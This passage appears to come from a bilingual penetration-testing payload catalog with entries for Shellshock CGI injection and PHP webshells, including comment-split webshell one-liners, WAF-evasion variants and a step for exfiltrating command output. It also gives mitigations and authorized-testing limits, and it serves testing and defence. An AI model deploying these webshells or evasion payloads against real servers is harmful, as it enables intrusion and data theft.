description.en: Pure-bash reverse shell without nc. Success: interactive shell obtained.

title.zh: attr 过滤器链

description.zh: 全程无点号绕过 . 过滤。判据：回显 uid。
description.en: No dots anywhere to dodge dot filters. Success: uid echoed.

title.zh: 规避变体：免 netcat fifo 反弹

description.zh: 规避点：目标无交互工具时用 fifo 管道常驻反弹。判据：监听端口收到 shell。
description.en: fifo pipe keeps a callback alive without interactive tools. Success: listener receives the shell.

name.zh: Shellshock CGI 环境变量命令执行

description.zh: 通过 curl 将 Shellshock 函数定义和固定标记放入 Cookie 或 User-Agent，验证 CGI 是否把请求头映射为环境变量并交给存在缺陷的 Bash 解析；curl 只是投递器，审核后的五行仅访问本机隔离实例。
description.en: Uses curl to place a Shellshock function definition and fixed marker in Cookie or User-Agent, testing whether CGI maps the header into an environment variable parsed by vulnerable Bash; curl is only the delivery client, and all five reviewed requests target a local isolated instance.

overview.zh: Shellshock CGI 环境变量命令执行针对 CVE-2014-6271 的完整数据流：HTTP 请求头经 CGI 转为环境变量，再由存在缺陷的 Bash 在导入函数定义时执行尾随文本。验证 Cookie 与 User-Agent 两类投递通道。
overview.en: Shellshock CGI environment-variable command execution targets the full CVE-2014-6271 data flow: HTTP headers become CGI environment variables, then vulnerable Bash executes trailing text when importing function definitions. It validates the Cookie and User-Agent delivery channels.

vulnerability.zh: 漏洞根因是受影响 Bash 从环境变量恢复函数时不在函数体结束处停止解析，导致函数定义后的命令也被执行；只有后续组件确实调用受影响 Bash 时这条输入链才成立。
vulnerability.en: The root cause is affected Bash failing to stop parsing at the end of a function body when restoring functions from environment variables, so commands after the definition also execute; the chain holds only when a downstream component actually invokes vulnerable Bash.

exploitation.zh: 按第 1 步分别以 Cookie 与 User-Agent 头携带 () { :;}; 加固定标记的请求发送到 /cgi-bin/test.sh；命中判据为 CGI 响应体出现 SHELLSHOCK_TEST_MARKER，证明环境变量中的尾随文本被执行。两条通道逐一验证并记录 CGI 子进程日志；确认执行能力后可把标记替换为读取授权标记文件的命令形成证据。curl 仅是投递器，全部请求只访问本机隔离实例。
exploitation.en: As in step 1, send requests carrying () { :;}; plus a fixed marker in the Cookie and User-Agent headers to /cgi-bin/test.sh; a hit is SHELLSHOCK_TEST_MARKER in the CGI response body, proving trailing text in environment variables executed. Validate both channels separately with CGI child-process logs; once execution is confirmed, swap the marker for commands reading authorized marker files as evidence. curl is only the delivery vehicle—every request targets the local isolated instance.

mitigation.zh: 升级 Bash 到供应商已修复版本并重启长期运行进程，移除不必要的 CGI，避免 CGI 脚本或其子进程调用 Bash，并限制传入解释器的环境变量。修复后以第 1 步同一标记重放请求头，确认已修复实例不执行尾随文本且正常 CGI 业务可用。
mitigation.en: Upgrade Bash to vendor-fixed versions and restart long-running processes, remove unnecessary CGI, keep CGI scripts and their children from invoking Bash, and limit environment variables passed to interpreters. After the fix, replay the step-1 headers with the same marker and confirm the patched instance does not execute trailing text while normal CGI business works.

title.zh: 定位 CGI 端点

description.zh: 枚举 cgi-bin 下的脚本与其他 CGI 处理路径，找到接受请求头的入口。命中判据：CGI 入口可达且处理 Header。
description.en: Enumerate cgi-bin scripts and CGI paths that consume headers. Success: a header-consuming CGI is reachable.

title.zh: 注入环境变量函数体

description.zh: 以 () { :;} 形式的 Cookie 与 User-Agent 注入 printf 标记命令。命中判据：CGI 响应体出现标记输出。
description.en: Send () { :;} bodies via Cookie/User-Agent that printf a marker. Success: the marker appears in the response.

title.zh: 扩大 Header 注入面

description.zh: 换 Referer 等其他映射为环境变量的头重复注入流程，覆盖更多入口。命中判据：多个头均可触发命令执行。
description.en: Retry through Referer and other env-mapped headers. Success: multiple headers trigger execution.

title.zh: 执行命令外带输出

description.zh: 把标记换成真实命令，将结果写入响应或经网络通道外带。命中判据：命令输出成功到达接收端，并且该效果可以稳定重复取得。
description.en: Swap the marker for real commands and exfiltrate results. Success: output reaches the collector.

review.rationale: Shellshock CGI 环境变量命令执行保留为 RCE Payload：curl 只是投递器，核心输入是进入 CGI 环境变量并由受影响 Bash 解析的函数定义与尾随命令；原五行反连命令已由 command override 替换为本地固定 marker。

prerequisites.zh: 目标是明确授权的隔离 CGI 实例，请求头会映射为环境变量，CGI 脚本或子进程实际调用 Bash，并且 Bash 版本与供应商补丁状态可以核验。
prerequisites.en: The target is an explicitly authorized isolated CGI instance where headers become environment variables, a CGI script or child actually invokes Bash, and the Bash version and vendor patch status are verifiable.

prerequisites.zh: command override 已将反连尾随命令替换为本地一次性 printf 标记，并可关联 curl 详细请求、CGI 环境、子进程日志和已修复实例对照。
prerequisites.en: The command override replaces the reverse-shell trailing command with a local one-time printf marker, and verbose curl output, CGI environment, child-process logs, and a patched control can be correlated.

analysis.zh: 阳性必须证明受影响 Bash 从该请求对应的 CGI 环境变量恢复函数时执行了固定尾随标记，并由相同请求 ID 的 Header、环境快照、CGI 子进程日志和标记输出共同佐证。仅有 CGI 200/500、函数定义被回显或记录、Bash 版本字符串、curl 请求成功、未关联的网络连接，或在已获得 Shell 中手工执行命令，均不能证明 Shellshock RCE。
analysis.en: A positive requires proof that affected Bash executed the fixed trailing marker while restoring a function from the CGI environment for that request, corroborated by the same request identifier, header, environment snapshot, CGI child log, and marker output. CGI 200 or 500, reflected or logged function syntax, a Bash version string, a successful curl request, an uncorrelated connection, or manual command execution in an existing shell does not prove Shellshock RCE.

opsecTips.zh: Shellshock CGI 环境变量命令执行停止条件：原五行反连命令只允许离线保存，不得直接执行；复验仅使用本地固定 marker。出现外连、交互 Shell、文件写入、真实数据返回、进程异常或服务不稳定时立即停止并记录请求 ID。
opsecTips.en: Shellshock CGI Environment-Variable Command Execution stop condition: retain the five reverse-shell lines offline only and never replay them directly; validation uses a local fixed marker. Stop and record the request identifier on egress, an interactive shell, file writes, real-data return, process anomalies, or service instability.

opsecTips.zh: Shellshock CGI 环境变量命令执行清理条件：删除固定 marker 和测试 CGI，清理含测试 Header 的缓存与临时日志，关闭任何本地监听器，恢复 CGI 配置并销毁旧 Bash 实例；最后确认没有遗留子进程或环境变量。
opsecTips.en: Shellshock CGI Environment-Variable Command Execution cleanup condition: remove fixed markers and test CGI files, clear caches and temporary logs containing test headers, close local listeners, restore CGI configuration, and destroy the legacy Bash instance; finally confirm no child process or environment variable remains.

title.zh: User-Agent 载体变体

description.zh: 绕过仅检查 Cookie 头的 WAF 规则：把环境变量函数定义移到 User-Agent；成功判据：响应体出现 UA_MARKER。
description.en: Bypasses WAFs inspecting only the Cookie header by moving the function definition into User-Agent. Success: UA_MARKER appears in the response body.

title.zh: Referer 与函数体变形

description.zh: 改用 Referer 头并替换函数体 { :;} 为 { ignored;}，规避 () { :;} 特征匹配；成功判据：REF_MARKER 回显。
description.en: Switches to the Referer header and mutates the function body from { :;} to { ignored;} to evade the () { :;} signature. Success: REF_MARKER echoed.

title.zh: Base64 载荷外带变体

description.zh: 用自定义头携带注入并把命令 base64 编码，绕过明文命令检测；成功判据：响应含 X_MARKER。
description.en: Carries the injection in a custom header with the command base64-encoded, evading plaintext detection. Success: X_MARKER present in the response.

name.zh: PHP 请求参数 WebShell

description.zh: 覆盖 system、shell_exec、passthru、反引号、动态函数与历史 eval/assert 形式，验证上传或写入的 PHP 文件是否把请求参数解释为代码或命令。
description.en: Covers system, shell_exec, passthru, backticks, dynamic functions, and legacy eval or assert forms to test whether an uploaded or written PHP file interprets request parameters as code or commands.

overview.zh: PHP 请求参数 WebShell 针对上传或写入的 PHP 文件把请求参数解释为代码或命令的场景：system、shell_exec、passthru、反引号与动态函数均可成为入口。验证一句话木马的部署与参数回连。
overview.en: PHP request-parameter webshells target uploaded or written PHP files interpreting request parameters as code or commands: system, shell_exec, passthru, backticks, and dynamic functions all serve as entries. It validates webshell deployment and parameter callbacks.

vulnerability.zh: 风险根因是攻击者可将 PHP 内容写入可访问且可执行位置，服务器处理器映射到 PHP，并且请求参数到达危险函数；三个条件共同构成执行链，缺一则文件只是静态内容。
vulnerability.en: The risk root is attackers writing PHP content into accessible, executable locations with the server handler mapping to PHP while request parameters reach dangerous functions; the three conditions together form the execution chain—missing any leaves the file static content.

exploitation.zh: 在授权测试中按第 1 步把 system($_GET['cmd']) 等一句话样例部署到目标可执行位置，随后以 cmd=id、1=id、a=id 等参数逐个请求；命中判据为部署后以对应参数请求返回命令输出。逐个记录生效的参数名与函数形态；验证仅在授权范围进行，确认能力后以读取标记文件替代敏感命令取证。
exploitation.en: In authorized testing, deploy the step-1 one-liner samples such as system($_GET['cmd']) to target executable locations, then request each with parameters like cmd=id, 1=id, and a=id; a hit is command output returned per corresponding parameter after deployment. Record the effective parameter names and function forms per sample; validate only within authorization and, once capability is confirmed, gather evidence with marker-file reads instead of sensitive commands.

mitigation.zh: 将上传文件存于 Web 根目录外并设为不可执行，移除动态命令接口，按上下文处理参数，升级 PHP 并删除 assert/create_function 等旧路径。修复后重放第 1 步部署与请求，确认 PHP 文件不再被解释执行且正常业务可用。
mitigation.en: Store uploads outside the web root as non-executable, remove dynamic command interfaces, process parameters contextually, upgrade PHP, and retire legacy paths like assert/create_function. After the fix, replay the step-1 deployment and requests, confirming PHP files are no longer interpreted while normal business works.

title.zh: 获取可写可执行位置

description.zh: 通过上传或包含漏洞取得可写且被 PHP 处理的位置。命中判据：写入的文件可以被访问执行，为后续深入利用打下基础。
description.en: Use upload or include flaws to reach a writable PHP-served path. Success: written files execute.

title.zh: 部署一句话木马

description.zh: 写入 system、eval 与反引号形态的请求参数木马文件。命中判据：cmd 参数返回命令输出，并且重复提交时可以稳定复现该结果。
description.en: Write system/eval/backtick one-liners keyed to request params. Success: cmd returns command output.

title.zh: 参数通道执行命令
title.en: Run commands via the parameter channel

description.zh: 以 GET、POST 参数通道执行命令并读写服务器文件。命中判据：操作结果可以稳定返回，多次提交均能得到相同结果。
description.en: Drive commands and file ops through GET/POST params. Success: results return reliably.

title.zh: 变形规避静态查杀

description.zh: 用动态调用与短标签等历史语法变形躲避特征检测。命中判据：变形后的木马仍然可用，并且该效果可以稳定重复取得。
description.en: Reshape with dynamic calls and legacy syntax to dodge signatures. Success: the mutant still works.

review.rationale: PHP 请求参数 WebShell保留为 Payload，因为它描述具体输入到解析器、运行时或文件/进程能力的数据流，并有明确证据标准。

prerequisites.zh: 已在授权隔离环境定位“PHP 请求参数 WebShell”的真实输入点、处理器和运行时版本，并确认：攻击者可将 PHP 内容写入可访问且可执行位置，服务器处理器映射到 PHP，并且请求参数到达危险函数。
prerequisites.en: The authorized isolated environment identifies the real input, handler, and runtime version for PHP Request-Parameter Webshells, confirming that an attacker can place PHP content in an accessible executable location, the server maps it to PHP, and request parameters reach dangerous functions.

prerequisites.zh: 测试 worker 可随时销毁，并能同时观察最终规范文件名、PHP 处理器日志、一次性固定输出和对应请求参数能够关联。
prerequisites.en: The test worker is disposable and can observe the final canonical filename, PHP handler log, one-time fixed output, and corresponding request parameter correlate.

analysis.zh: 阳性要求可控输入连续到达危险运行时 API，并取得最终规范文件名、PHP 处理器日志、一次性固定输出和对应请求参数能够关联。代码片段、语法错误、HTTP 200、参数回显，或在已有本地 Shell 中手工运行命令均属假阳性或前置能力，不能证明“PHP 文件是否由服务器解释，并把 GET 或 POST 参数传给命令执行、动态函数或代码求值结构”。
analysis.en: A positive requires a continuous path from controllable input to a dangerous runtime API plus the final canonical filename, PHP handler log, one-time fixed output, and corresponding request parameter correlate. Snippets, syntax errors, HTTP 200, reflection, or manual commands after an existing shell are false positives or prerequisites and do not prove whether the server interprets a PHP file and passes GET or POST values to command execution, dynamic functions, or code evaluation.

opsecTips.zh: PHP 请求参数 WebShell停止条件：“PHP 请求参数 WebShell”只允许使用一次性固定标记；出现非预期子进程、外部网络、文件写入或权限变化时，立即终止 worker 并停止测试。 本条重点观察“PHP 文件是否由服务器解释，并把 GET 或 POST 参数传给命令执行、动态函数或代码求值结构”。
opsecTips.en: PHP Request-Parameter Webshells stop condition: Use only a one-time fixed marker for PHP Request-Parameter Webshells; terminate the worker and stop on unexpected child processes, external network, writes, or privilege changes. The entry-specific focus is whether the server interprets a PHP file and passes GET or POST values to command execution, dynamic functions, or code evaluation.

opsecTips.zh: PHP 请求参数 WebShell清理条件：结束后删除标记与临时脚本，关闭全部子进程，重建 worker，并确认日志未残留凭据、命令输出或业务数据。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: PHP Request-Parameter Webshells cleanup condition: Remove markers and temporary scripts, terminate child processes, rebuild the worker, and verify logs contain no credentials, command output, or business data. Recheck that no triggerable state remains for this technique.

name.zh: PHP 标识符注释分割样例

description.zh: 尝试用块注释拆分 system、eval、assert 等函数名，验证 PHP 词法规则与上传/WAF 检测之间的差异；多数拆分函数名并非有效 PHP。
description.en: Attempts to split system, eval, assert, and related function names with block comments to compare PHP lexical rules with upload or WAF detection; most split identifiers are not valid PHP.

subCategory.zh: PHP 词法与 WAF 差异

overview.zh: PHP 标识符注释分割样例针对用块注释拆分函数名绕过检测的场景：WAF 是否放行注释分割形式与 PHP lexer 是否仍识别为同一函数是两层独立问题。验证 /**/ 分割的 system/eval/assert 变体。
overview.en: PHP identifier comment-splitting samples target splitting function names with block comments to evade detection: whether the WAF passes comment-split forms and whether the PHP lexer still recognizes the same function are two independent questions. It validates /**/-split system/eval/assert variants.

vulnerability.zh: 多层差异出现在边缘规则只做字符串匹配而 PHP lexer 按语言规则解析标识符时；应用漏洞仍以最终可执行 PHP 数据流为前提，边缘规则只是纵深防御，放行但语法无效的样例应记为阴性。
vulnerability.en: Layer differences appear when edge rules do string matching while the PHP lexer parses identifiers by language rules; the application vulnerability still requires an executable PHP data stream—edge rules are defense in depth, and samples passing filters but invalid syntactically must be recorded negative.

exploitation.zh: 按第 1 步逐条提交 <?php sys/**/tem($_GET['cmd']); ?> 等注释分割变体，先经 PHP -l 或等价方式确认语法有效性再部署到授权测试位；命中判据为注释分割后代码仍按原函数执行并返回命令输出。同时记录 WAF 对原始请求的动作，构建放行/拦截与有效/无效的二维对照；语法错误的变体明确记录为阴性，不得据此断言 RCE。
exploitation.en: Per step 1, submit <?php sys/**/tem($_GET['cmd']); ?> and similar comment-split variants one by one, confirming syntax validity via php -l or equivalent before deploying to authorized test positions; a hit is the comment-split code still executing as the original function and returning command output. Also record WAF actions on the raw requests, building a two-dimensional pass/block versus valid/invalid contrast; explicitly mark syntactically invalid variants negative—never assert RCE from them.

mitigation.zh: 应用侧移除可写可执行 PHP 路径，WAF 在统一解码后使用语法感知规则；维护条目必须明确标记无效词法变体。修复后回归合法 PHP 业务、原始异常行和同义变体，确认上传/写入边界不可执行且 WAF 与应用采用一致的规范化模型。
mitigation.en: Remove writable-executable PHP paths on the application side and have the WAF apply syntax-aware rules after unified decoding; maintained entries must clearly mark invalid lexical variants. After the fix, regress legitimate PHP business, original anomalous lines, and synonym variants, confirming upload/write boundaries are non-executable and WAF and application share one normalization model.

title.zh: 固定“PHP 标识符注释分割样例”多层版本
title.en: Pin the PHP Identifier Comment-Splitting Samples processing versions

description.zh: 记录 WAF 规则、PHP 版本、源站处理器与请求路径，核对前提“输入进入 PHP 可执行文件或求值上下文，边缘规则只做字符串匹配，且测试 PHP 版本与样例语法相符”。
description.en: Record WAF rules, PHP version, origin handler, and request path, confirming that input reaches an executable PHP file or evaluator, edge rules use string matching, and the tested PHP version matches the sample syntax.

title.zh: 执行 PHP 语法与基线检查
title.en: Run PHP syntax and baseline checks

description.zh: 先对原行做 lint 并保存未变形请求基线，采用“WAF 动作、PHP lint 结果、运行时错误或固定标记输出通过请求 ID 对应，放行但语法错误记为阴性”区分放行、语法失败与真实执行。
description.en: Lint original lines and record an unmodified request baseline, using WAF action, PHP lint result, runtime error or fixed marker output correlate by request ID, and accepted but invalid syntax is recorded as negative to separate acceptance, syntax failure, and execution.

title.zh: 单变量验证“PHP 标识符注释分割样例”
title.en: Run a single-variable PHP Identifier Comment-Splitting Samples check

description.zh: 测试步骤为：先对每行执行 php -l，再向测试 WAF 提交；只有同时通过 lexer 并产生固定无害结果的行才进入浏览器或请求回归。只改变一种词法或编码形式，实际运行使用无害 PHP 表达式。
description.en: run php -l on every line before submitting it to a test WAF, and only carry lines that both parse and produce a fixed harmless result into request regression. Change one lexical or encoding form and use a harmless PHP expression at runtime.

attackChain.payload:
<?php sys/**/tem($_GET['cmd']); ?>
<?php syst/**/em($_GET['cmd']); ?>
<?php e/**/va/**/l($_POST['cmd']);?>
<?php a/**/ss/**/ert($_POST['cmd']);?>
<?php pa/**/sst/**/hru($_GET['cmd']); ?>
<?php sh/**/el/**/l_ex/**/ec($_GET['cmd']); ?>
<?php fil/**/e_ge/**/t_con/**/tents('/flag'); ?>

title.zh: 统一规范化并移除求值路径

description.zh: 实施“应用侧移除可写可执行 PHP 路径，WAF 在统一解码后使用语法感知规则；维护条目必须明确标记无效词法变体”并重放所有有效与无效行，确认源站不可执行且 WAF 结论与 PHP parser 一致。
description.en: Apply remove writable executable PHP paths, use syntax-aware WAF rules after canonicalization, and explicitly tag lexically invalid variants in the catalog and replay valid and invalid lines to prove the origin is non-executable and WAF decisions match the PHP parser.

review.rationale: PHP 标识符注释分割样例保留为 Payload，因为它描述具体输入到解析器、运行时或文件/进程能力的数据流，并有明确证据标准。

prerequisites.zh: 已固定“PHP 标识符注释分割样例”使用的 WAF 规则集、PHP 版本、源站处理器和请求路径，并确认：输入进入 PHP 可执行文件或求值上下文，边缘规则只做字符串匹配，且测试 PHP 版本与样例语法相符。
prerequisites.en: The WAF ruleset, PHP version, origin handler, and request path for PHP Identifier Comment-Splitting Samples are pinned, confirming that input reaches an executable PHP file or evaluator, edge rules use string matching, and the tested PHP version matches the sample syntax.

prerequisites.zh: 隔离站点可同时取得 WAF 动作、PHP lint/运行结果和WAF 动作、PHP lint 结果、运行时错误或固定标记输出通过请求 ID 对应。
prerequisites.en: The isolated site can capture WAF action, PHP lint or runtime results, and WAF action, PHP lint result, runtime error or fixed marker output correlate by request ID, and accepted but invalid syntax is recorded as negative.

analysis.zh: 阳性要求同一输入被 WAF 放行、在目标 PHP 版本语法有效、到达可执行位置并取得WAF 动作、PHP lint 结果、运行时错误或固定标记输出通过请求 ID 对应。放行但 lint 失败、函数在该版本失效、仅返回源码或未进入 PHP handler 均为假阳性，不能证明“WAF 是否放行注释分割形式，以及 PHP lexer 是否仍把拆分后的字符识别为同一函数标识符”。
